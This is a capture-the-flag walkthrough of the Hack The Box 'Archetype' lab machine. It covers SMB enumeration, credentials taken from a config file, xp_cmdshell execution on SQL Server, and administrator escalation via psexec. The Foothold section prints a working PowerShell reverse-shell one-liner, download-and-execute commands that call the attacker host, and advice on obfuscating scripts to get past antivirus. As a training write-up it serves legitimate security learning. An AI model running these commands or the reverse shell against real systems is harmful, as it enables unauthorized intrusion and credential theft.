# Archetype
![hackthebox_logo](https://user-images.githubusercontent.com/83867734/141313996-2c2024f2-3775-4bfb-9809-5d51005379c3.png)


Machines
--
Attacker:
* Name: attacker_machine
* Operating System: Parrot OS
* IP Address: 10.10.14.185

Victim:
* Name: victim_machine
* IP Address: 10.10.10.27
* Other information must be gathered during the attack

Phase 1: Enumeration
--
On the attacker_machine:

    sudo nmap -sS -A 10.10.10.27 -vvv
    
![image](https://user-images.githubusercontent.com/83867734/141313948-25a90efb-2363-475c-a0e3-0ff3a0274973.png)

The most important information is port 445/tcp (SMB – file sharing) and port 1433/tcp (Microsoft SQL Server).

This evidence opens a scenario: often, the file shares could store configuration files containing credentials or other sensitive information.

Now check if the anonymous access is permitted. For first, we can use **`smbclient`** to list available shares:

    smbclient -N -L \\\\10.10.10.27\\
    
    Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	backups         Disk      
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
    SMB1 disabled -- no workgroup available

Used arguments:
* -N, --no-pass: Don't ask for a password
* -L, --list=HOST: Get a list of shares available on a host

Note: the `\` is used doubled because backslash character allows to escape a single character or symbol. Only the character immediately following the backslash is escaped.

IMPORTANT: some target servers could use very old version of SMB (i.e., SMBv1) and by default `smbclient` should work with SMBv2 as minimum protocol. If we try to connect to these old version target servers, we will get a `protocol negotiation failed: NT_STATUS_IO_TIMEOUT` error. For connecting correctly, we need to run the command in the following manner:
```
smbclient -N -L \\\\10.10.10.27\\ --option="client min protocol=CORE"
```

If we try to access to the several shares, we get an error tree connect failed: **`NT_STATUS_ACCESS_DENIED`**. The only share we can anonymously access is **`backups`**. Indeed:

    smbclient -N \\\\10.10.10.27\\backups
    smb: \> dir
      .                                   D        0  Mon Jan 20 12:20:57 2020
      ..                                  D        0  Mon Jan 20 12:20:57 2020
      prod.dtsConfig                     AR      609  Mon Jan 20 12:23:02 2020

		                10328063 blocks of size 4096. 8260702 blocks available

We found one configutation file named **`prod.dtsConfig`**. We can read it by getting the file on our attacker_machine:

    smb: \> get prod.dtsConfig
    
or reading directly on the victim_machine:

    smb: \> more prod.dtsConfig

The content of the file is the following:

```xml
<DTSConfiguration>
    <DTSConfigurationHeading>
        <DTSConfigurationFileInfo GeneratedBy="..." GeneratedFromPackageName="..." GeneratedFromPackageID="..." GeneratedDate="20.1.2019 10:01:34"/>
    </DTSConfigurationHeading>
    <Configuration ConfiguredType="Property" Path="\Package.Connections[Destination].Properties[ConnectionString]" ValueType="String">
        <ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;</ConfiguredValue>
    </Configuration>
</DTSConfiguration>
```
We can immediately see the credentials on the **`Password`** and **`User ID`** variables.

At this point, we have several ways to go ahead or gather more information, for example, we can use Metasploit modules or Impacket's mssqlclient.py. The modules we can use with Metasploit are:

    msf6 > search mssql

    Matching Modules
    ================
    
       #   Name                                                      Disclosure Date  Rank       Check  Description
       -   ----                                                      ---------------  ----       -----  -----------
       0   exploit/windows/misc/ais_esel_server_rce                  2019-03-27       excellent  Yes    AIS logistics ESEL-Server Unauth SQL Injection RCE
       1   auxiliary/server/capture/mssql                                             normal     No     Authentication Capture: MSSQL
       2   auxiliary/gather/lansweeper_collector                                      normal     No     Lansweeper Credential Collector
       3   exploit/windows/mssql/lyris_listmanager_weak_pass         2005-12-08       excellent  No     Lyris ListManager MSDE Weak sa Password
       4   exploit/windows/mssql/ms02_039_slammer                    2002-07-24       good       Yes    MS02-039 Microsoft SQL Server Resolution Overflow
       5   exploit/windows/mssql/ms02_056_hello                      2002-08-05       good       Yes    MS02-056 Microsoft SQL Server Hello Overflow
       6   exploit/windows/mssql/ms09_004_sp_replwritetovarbin       2008-12-09       good       Yes    MS09-004 Microsoft SQL Server sp_replwritetovarbin Memory Corruption
       7   exploit/windows/mssql/ms09_004_sp_replwritetovarbin_sqli  2008-12-09       excellent  Yes    MS09-004 Microsoft SQL Server sp_replwritetovarbin Memory Corruption via SQL Injection
       8   exploit/windows/iis/msadc                                 1998-07-17       excellent  Yes    MS99-025 Microsoft IIS MDAC msadcs.dll RDS Arbitrary Remote Command Execution
       9   auxiliary/scanner/mssql/mssql_login                                        normal     No     MSSQL Login Utility
       10  auxiliary/scanner/mssql/mssql_hashdump                                     normal     No     MSSQL Password Hashdump
       11  auxiliary/scanner/mssql/mssql_ping                                         normal     No     MSSQL Ping Utility
       12  auxiliary/scanner/mssql/mssql_schemadump                                   normal     No     MSSQL Schema Dump
       13  exploit/windows/mssql/mssql_clr_payload                   1999-01-01       excellent  Yes    Microsoft SQL Server Clr Stored Procedure Payload Execution
       14  auxiliary/admin/mssql/mssql_enum                                           normal     No     Microsoft SQL Server Configuration Enumerator
       15  exploit/windows/mssql/mssql_linkcrawler                   2000-01-01       great      No     Microsoft SQL Server Database Link Crawling Command Execution
       16  auxiliary/admin/mssql/mssql_escalate_dbowner                               normal     No     Microsoft SQL Server Escalate Db_Owner
       17  auxiliary/admin/mssql/mssql_escalate_execute_as                            normal     No     Microsoft SQL Server Escalate EXECUTE AS
       18  auxiliary/admin/mssql/mssql_findandsampledata                              normal     No     Microsoft SQL Server Find and Sample Data
       19  auxiliary/admin/mssql/mssql_sql                                            normal     No     Microsoft SQL Server Generic Query
       20  auxiliary/admin/mssql/mssql_sql_file                                       normal     No     Microsoft SQL Server Generic Query from File
       21  auxiliary/admin/mssql/mssql_idf                                            normal     No     Microsoft SQL Server Interesting Data Finder
       22  auxiliary/admin/mssql/mssql_ntlm_stealer                                   normal     No     Microsoft SQL Server NTLM Stealer
       23  exploit/windows/mssql/mssql_payload                       2000-05-30       excellent  Yes    Microsoft SQL Server Payload Execution
       24  exploit/windows/mssql/mssql_payload_sqli                  2000-05-30       excellent  No     Microsoft SQL Server Payload Execution via SQL Injection
       25  auxiliary/admin/mssql/mssql_escalate_dbowner_sqli                          normal     No     Microsoft SQL Server SQLi Escalate Db_Owner
       26  auxiliary/admin/mssql/mssql_escalate_execute_as_sqli                       normal     No     Microsoft SQL Server SQLi Escalate Execute AS
       27  auxiliary/admin/mssql/mssql_ntlm_stealer_sqli                              normal     No     Microsoft SQL Server SQLi NTLM Stealer
       28  auxiliary/admin/mssql/mssql_enum_domain_accounts_sqli                      normal     No     Microsoft SQL Server SQLi SUSER_SNAME Windows Domain Account Enumeration
       29  auxiliary/admin/mssql/mssql_enum_sql_logins                                normal     No     Microsoft SQL Server SUSER_SNAME SQL Logins Enumeration
       30  auxiliary/admin/mssql/mssql_enum_domain_accounts                           normal     No     Microsoft SQL Server SUSER_SNAME Windows Domain Account Enumeration
       31  auxiliary/admin/mssql/mssql_exec                                           normal     No     Microsoft SQL Server xp_cmdshell Command Execution
       32  auxiliary/analyze/crack_databases                                          normal     No     Password Cracker: Databases
       33  exploit/windows/http/plesk_mylittleadmin_viewstate        2020-05-15       excellent  Yes    Plesk/myLittleAdmin ViewState .NET Deserialization
       34  post/windows/gather/credentials/mssql_local_hashdump                       normal     No     Windows Gather Local SQL Server Hash Dump
       35  post/windows/manage/mssql_local_auth_bypass                                normal     No     Windows Manage Local Microsoft SQL Server Authorization Bypass
       
For example, we can check if the sql_svc user has sysadmin privileges on database or not:

    msf6 > use auxiliary/admin/mssql/mssql_escalate_dbowner
    msf6 auxiliary(admin/mssql/mssql_escalate_dbowner) > show options
    
    Module options (auxiliary/admin/mssql/mssql_escalate_dbowner):
    
       Name                 Current Setting  Required  Description
       ----                 ---------------  --------  -----------
       PASSWORD                              no        The password for the specified username
       RHOSTS                                yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
       RPORT                1433             yes       The target port (TCP)
       TDSENCRYPTION        false            yes       Use TLS/SSL for TDS data "Force Encryption"
       USERNAME             sa               no        The username to authenticate as
       USE_WINDOWS_AUTHENT  false            yes       Use windows authentification (requires DOMAIN option set)
    
    msf6 auxiliary(admin/mssql/mssql_escalate_dbowner) > setg RHOSTS 10.10.10.27
    RHOSTS => 10.10.10.27
    msf6 auxiliary(admin/mssql/mssql_escalate_dbowner) > setg USERNAME sql_svc
    USERNAME => sql_svc
    msf6 auxiliary(admin/mssql/mssql_escalate_dbowner) > setg PASSWORD M3g4c0rp123
    PASSWORD => M3g4c0rp123
    msf6 auxiliary(admin/mssql/mssql_escalate_dbowner) > setg USE_WINDOWS_AUTHENT true
    USE_WINDOWS_AUTHENT => true
    msf6 auxiliary(admin/mssql/mssql_escalate_dbowner) > setg DOMAIN ARCHETYPE
    DOMAIN => ARCHETYPE
    msf6 auxiliary(admin/mssql/mssql_escalate_dbowner) > run
    [*] Running module against 10.10.10.27
    
    [*] 10.10.10.27:1433 - Attempting to connect to the database server at 10.10.10.27:1433 as sql_svc...
    [+] 10.10.10.27:1433 - Connected.
    [*] 10.10.10.27:1433 - Checking if sql_svc has the sysadmin role...
    [+] 10.10.10.27:1433 - sql_svc has the sysadmin role, no escalation required.
    [*] Auxiliary module execution completed

In this case, sql_svc has the sysadmin role, so no escalation is required.
We can use also other Metasploit modules but let's go deep by using Impacket's mssqlclient.py:

    impacket-mssqlclient -windows-auth ARCHETYPE/sql_svc:M3g4c0rp123@10.10.10.27
    Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

    [*] Encryption required, switching to TLS
    [*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
    [*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
    [*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
    [*] INFO(ARCHETYPE): Line 1: Changed database context to 'master'.
    [*] INFO(ARCHETYPE): Line 1: Changed language setting to us_english.
    [*] ACK: Result: 1 - Microsoft SQL Server (140 3232) 
    [!] Press help for extra shell commands
    SQL>
    
Now we can perform SQL query as we want as specified [here](https://book.hacktricks.xyz/pentesting/pentesting-mssql-microsoft-sql-server#abusing-mssql-trusted-links). For example, we can use the **`IS_SRVROLEMEMBER`** function to check if our SQL user has sysadmin privileges on the SQL Server:

    SQL> SELECT IS_SRVROLEMEMBER ('sysadmin')
                  
    
    -----------   

              1     
	     
Since we have sysadmin privileges, we can enable **`xp_cmdshell`** that allows us to run commands and gain RCE on the host. For enabling xp_cmdshell:

    SQL> EXEC sp_configure 'Show Advanced Options', 1;
    SQL> reconfigure;
    SQL> sp_configure;
    SQL> EXEC sp_configure 'xp_cmdshell', 1
    SQL> reconfigure;
    SQL> xp_cmdshell "whoami"
    SQL> xp_cmdshell net localgroup administrators
    
By the last command, we can see that only "Administrator" is in the "administrators" group, so by sql_svc we don't have high privileges on the host.

Phase 2: Foothold
--
We can use **`xp_cmdshell`** to surf the several folders of the host where we can access. So, by xp_cmdshell, we got RCE. For example:

    SQL> xp_cmdshell dir C:\Users\sql_svc\Desktop
    output                                                                             
    
    --------------------------------------------------------------------------------   
    
     Volume in drive C has no label.                                                   
    
     Volume Serial Number is CE13-2325                                                 
    
    NULL                                                                               
    
     Directory of C:\Users\sql_svc\Desktop                                             
    
    NULL                                                                               
    
    01/20/2020  06:42 AM    <DIR>          .                                           
    
    01/20/2020  06:42 AM    <DIR>          ..                                          
    
    02/25/2020  07:37 AM                32 user.txt                                    
    
                   1 File(s)             32 bytes                                      
    
                   2 Dir(s)  33,834,606,592 bytes free                                 

We note a file .txt that we can access in the following manner:

    SQL> xp_cmdshell more C:\Users\sql_svc\Desktop\user.txt                                                                            
    
And we get the first flag.

The second flag must be caught for proving that we pown the host, so we need to escalate to Administrator privilege.

For doing this, for first we must find where could be the password of Administrator. Usually, you could find it on the command history of command line tools, for example:

    SQL> xp_cmdshell powershell Get-Content (Get-PSReadlineOption).HistorySavePath
    
    --------------------------------------------------------------------------------   

    net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
    
It is possible accessing to the victim host folders also by injecting a reverse shell. You can find more reverse shells at [RevShells.com](https://www.revshells.com/) or the [Invoke-PowerShellTcpOneLine](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLine.ps1) by the [Nishang framework](https://github.com/samratashok/nishang), that is what we choose, and customize it with your current IP address, port, and other options — like the following PowerShell reverse shell as shell.ps1 (keep in mind that it’s an one-liner command):

```powershell
$client = New-Object System.Net.Sockets.TCPClient("10.10.14.185",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "# ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

So, in the attacker machine, execute a small webserver in Python in order to host the file:

    python3 -m http.server 80
    
or

    python -m SimpleHTTPServer 80
    
listening on port 443 by using netcat:

    nc -lvnp 443
    
If you have your ufw firewall enabled in your VM, you’ll need to change the rules to allow incoming requests to ports 80 and 443:

    ufw allow from 10.10.10.27 proto tcp to any port 80,443
    
Then, we can execute the command to download and execute the reverse shell through xp_cmdshell:

    SQL> xp_cmdshell "powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.14.185/shell.ps1\");"
    
or:

    SQL> xp_cmdshell "powershell "IEX (New-Object Net.WebClient).DownloadFile(\"http://10.10.14.185/shell.ps1\",\"C:\Users\Public\shell.ps1\");"
    SQL> xp_cmdshell "powershell "C:\Users\Public\shell.ps1"
    
This last command returns an error (*Invoke-Expression : Cannot bind argument to parameter 'Command' because it is null.*) but if you navigate on the "C:\Users\Public" folder, you can see the *shell.ps1* file.

Note: in both cases we have one more " but it is not a problem.
Note: the root path of the http://ipaddress/ corresponds to the folder where we start the http server.
Note (again): if you receive a message that the PowerShell script is not run because could contain malicious content, just obfuscate the commands inside the script, for example by using tools like [ISESteroids](http://www.powertheshell.com/isesteroids/) or [Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation) or, again, just google it.

And back to our netcat and we see the shell:

    └──╼ $sudo nc -lvnp 443
    listening on [any] 443 ...
    connect to [10.10.14.185] from (UNKNOWN) [10.10.10.27] 49718

We get the shell on behalf of sql_svc and we can start to navigate the folders and get the files of the host by using the "type" command.

At this point, we can also execute some commands to retrieve more information about the system and the installed patches. Just look [here](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#system-info).

Phase 3: Privilege Escalation
--
Since now we have the Administrator password, we must search the .txt file containing the flag. To access with Administrator privilege, we can use PsExec. PsExec allows for remote command execution (and receipt of resulting output) over a named pipe with the Server Message Block (SMB) protocol, which runs on TCP port 445:

    impacket-psexec administrator@10.10.10.27
    Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

    Password:
    [*] Requesting shares on 10.10.10.27.....
    [*] Found writable share ADMIN$
    [*] Uploading file cNpZoEKc.exe
    [*] Opening SVCManager on 10.10.10.27.....
    [*] Creating service cqIX on 10.10.10.27.....
    [*] Starting service cqIX.....
    [!] Press help for extra shell commands
    Microsoft Windows [Version 10.0.17763.107]
    (c) 2018 Microsoft Corporation. All rights reserved.

    C:\Windows\system32> whoami
    nt authority\system

In case we don't know the specific name of the text file containing the flag, we can run this command:
* Linux Bash:	**`find / -name *.txt 2>/dev/null`**
* Windows PowerShell:	**`gci c:\ -Force -r -fi *.txt 2>NULL`**

gci searches also for hidden files.

If impacket-psexec returns an error like:
```
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

Password:
[*] Requesting shares on 10.129.51.235.....
[*] Found writable share ADMIN$
[*] Uploading file SqrWfHRA.exe
[*] Opening SVCManager on 10.129.51.235.....
[*] Creating service bLlf on 10.129.51.235.....
[*] Starting service bLlf.....
[*] Opening SVCManager on 10.129.51.235.....
[-] Error performing the uninstallation, cleaning up
```
it means that probably the Windows antivirus is blocking the file uploading. In this case, you can use `impacket-wmiexec` that does not need to upload anything on the target system.

Another method to escalate privileges could be using **`JuicyPotato`** tool because sql_svc account has SeImpersonatePrivilege privilege enabled. Also in this case, JuicyPotato.exe must be injected in the victim machine like above. The problem is that Windows Defender deletes .exe file when injected, or blocks its execution (*The system cannot execute the specified program*).

Suggested reading: [TCP port communications with PowerShell](https://livebook.manning.com/book/powershell-deep-dives/chapter-4/22)
